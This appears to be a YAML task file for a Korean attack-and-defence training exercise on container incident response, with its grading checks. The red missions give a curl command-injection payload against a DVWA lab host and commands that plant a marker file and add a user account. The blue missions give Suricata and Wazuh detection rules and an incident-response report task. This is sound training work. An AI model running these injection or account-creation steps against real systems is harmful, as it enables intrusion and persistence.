id: "cloud-container-w13"
category: "cloud-container"
title: "[클라우드/컨테이너 W13] 컨테이너 인시던트 대응 — 침해 컨테이너 vs 격리·포렌식"
difficulty: "hard"
time_limit: 2700
battle_type: "1v1"
description: |
  클라우드/컨테이너 13주차 — **컨테이너 인시던트 대응**. 침해된 컨테이너의 격리·포렌식·복구를 다룬다. 공격자는
  컨테이너를 침해하고, 점검자(너)는 격리·포렌식·복구를 수행한다.

  ▸ 이야기: 공격자가 컨테이너를 침해해(태그 `cc13r1`) 침해 흔적(`/tmp/.cc13incident`)과 계정 `cca13` 을 남긴다.
    점검자는 ① 침해 탐지, ② 격리/포렌식 Wazuh 룰, ③ 컨테이너 IR 절차·R/B/P 로 대응한다.

  ▸ 모드: solo/duel. 공격자=외부 공격자 VM({{ATTACKER_IP}})({{ATTACKER_IP}}), Red 채점=대상 흔적(WAF audit 태그/흔적 파일·계정).
  ▸ 마커: 태그 **`cc13r1-<본인id>`**, 침해 흔적 **`/tmp/.cc13incident`**(마커 `cc13`), 계정 **`cca13`**,
    Suricata **sid 9013011**, Wazuh **id 106131**. 종료 시 cleanup.

red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 20
    instruction: |
      ## 🎯 RED-1 [컨테이너 침해] — RCE 로 컨테이너 장악

      ### 할 일 (외부 공격자 VM {{ATTACKER_IP}})
      ```bash
      curl -s -A "cc13r1-kim" -H "Host: dvwa.el34.lab" \
        "http://{{WEB_ENTRY}}/vulnerabilities/exec/?ip=127.0.0.1;id%23cc13r1-kim&Submit=Submit"
      ```
      ### 채점 방법 / 합격 기준
      대상 WAF audit 에 태그 `cc13r1` 흔적 시 인정.
    hint: "태그(cc13r1) 컨테이너 침해(RCE) → 대상 modsec audit. 채점: log_contains modsec cc13r1."
    verify:
      type: "log_contains"
      expect: "cc13r1"
      checks:
        - { id: "red-1-1", type: "log_contains", target: "web",
            params: { log: "modsec", pattern: "cc13r1", since_sec: 1800 } }
      semantic:
        intent: "컨테이너 침해(T1190/T1059) — RCE 로 컨테이너 장악. IR 대상. 태그(cc13r1) 귀속."
        success_criteria: ["대상 WAF audit 에 cc13r1 태그", "침해 경로 서술"]
        acceptable_methods: ["외부 공격자 VM({{ATTACKER_IP}}) 에서 태그 단 침해"]
        negative_signs: ["태그 누락 / 대상 미도달"]

  - order: 2
    assess_target: opponent
    target_vm: web
    points: 15
    instruction: |
      ## 🎯 RED-2 [침해 흔적] — 컨테이너 내 발판 + 계정

      ### 할 일
      ```bash
      printf 'cc13 compromised: reverse shell in container, persistence in image layer' > /tmp/.cc13incident
      sudo useradd -m -s /bin/bash cca13
      ```
      ### 채점 방법 / 합격 기준
      `/tmp/.cc13incident`(마커 `cc13`) 또는 `cca13` 존재 시 인정.
    hint: "침해 흔적 /tmp/.cc13incident (마커 cc13) + useradd cca13. 채점: file_contains incident cc13 + file_contains passwd cca13."
    verify:
      type: "file_contains"
      expect: "cc13"
      checks:
        - { id: "red-2-1", type: "file_contains", target: "web",
            params: { path: "/tmp/.cc13incident", pattern: "cc13" } }
        - { id: "red-2-2", type: "file_contains", target: "web",
            params: { path: "/etc/passwd", pattern: "cca13" } }
      semantic:
        intent: "컨테이너 발판(T1059) + 계정(T1136) — IR 격리/포렌식 대상."
        success_criteria: ["/tmp/.cc13incident(마커 cc13) 또는 계정 cca13", "침해 발판 서술"]
        acceptable_methods: ["침해 흔적 + useradd"]
        negative_signs: ["흔적 미생성"]

blue_missions:
  - order: 1
    assess_target: self
    target_vm: ips
    points: 22
    instruction: |
      ## 🛡️ BLUE-1 [침해 탐지] — Suricata 룰 (sid 9013011)

      ### 할 일
      ```
      alert http any any -> any any (msg:"CLOUD-W13 container compromise (cmd injection)"; flow:to_server; http.uri; content:";id"; nocase; sid:9013011; rev:1;)
      ```
      ```bash
      sudo suricatasc -c reload-rules
      ```
      ### 채점 방법 / 합격 기준
      ips 의 `local.rules` 에 sid 9013011 룰 존재 시 인정.
    hint: "침해 탐지 Suricata 룰(sid 9013011) → reload. 채점: file_contains local.rules 9013011."
    verify:
      type: "file_contains"
      expect: "9013011"
      checks:
        - { id: "blue-1-1", type: "file_contains", target: "ips",
            params: { path: "/etc/suricata/rules/local.rules", pattern: "9013011" } }
      semantic:
        intent: "컨테이너 IR — 침해 탐지 Suricata 룰. 격리 트리거."
        success_criteria: ["local.rules 에 sid 9013011", "침해 탐지→격리 의의"]
        acceptable_methods: ["Suricata 룰 작성 + reload"]
        negative_signs: ["패턴 부정확 / 문법 오류"]

  - order: 2
    assess_target: self
    target_vm: siem
    points: 20
    instruction: |
      ## 🛡️ BLUE-2 [격리/포렌식] — Wazuh 룰 (id 106131)

      ### 할 일
      ```xml
      <group name="edu,container,ir,">
        <rule id="106131" level="13">
          <if_group>edu</if_group>
          <match>cca13</match>
          <description>CLOUD-W13 - container compromise / persistence / account (IR)</description>
        </rule>
      </group>
      ```
      ```bash
      sudo /var/ossec/bin/wazuh-control restart
      ```
      ### 채점 방법 / 합격 기준
      `local_rules.xml` 에 id 106131 룰 존재 시 인정.
    hint: "격리/포렌식 Wazuh 룰(id 106131) → restart. 채점: file_contains local_rules.xml 106131."
    verify:
      type: "file_contains"
      expect: "106131"
      checks:
        - { id: "blue-2-1", type: "file_contains", target: "siem",
            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "106131" } }
      semantic:
        intent: "컨테이너 IR — 침해/발판/계정 Wazuh 룰. 격리·포렌식 연계."
        success_criteria: ["local_rules.xml 에 rule id 106131", "침해 탐지 로직"]
        acceptable_methods: ["Wazuh 룰 작성 + restart"]
        negative_signs: ["탐지 로직 부실 / XML 오류"]

  - order: 3
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 [컨테이너 IR 절차·R/B/P]

      ### 할 일
      보고서에:
      - 컨테이너 IR 절차(격리(network disconnect/pause)/포렌식(이미지·메모리·로그 보존)/근절/이미지 재배포 복구) + 위험도
      - R/B/P 회고 + 침해 흔적(`/tmp/.cc13incident`)·계정(cca13) 헌팅
      ```bash
      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
      ```
      ### 채점 방법 / 합격 기준
      본인 SIEM 에 최근 경보 + 제출한 컨테이너 IR 절차·R/B/P 로 인정.
    hint: "컨테이너 IR(격리(pause/disconnect)/포렌식(이미지·메모리·로그 보존)/근절/이미지 재배포 복구) + R/B/P + 흔적/계정 헌팅. 채점: wazuh_alert + 제출."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "컨테이너 IR 종합 — 격리/포렌식/근절/복구 + R/B/P. 분석형 — 구체 IR 절차 제시 시 점수 상승."
        success_criteria:
          - "최근 경보 수집 확인"
          - "컨테이너 IR 절차(격리/포렌식/근절/이미지 재배포) + 위험도"
          - "R/B/P 회고 + 흔적/계정 헌팅"
        acceptable_methods: ["IR 절차 + 회고 + 헌팅"]
        negative_signs: ["IR 절차/회고 누락"]
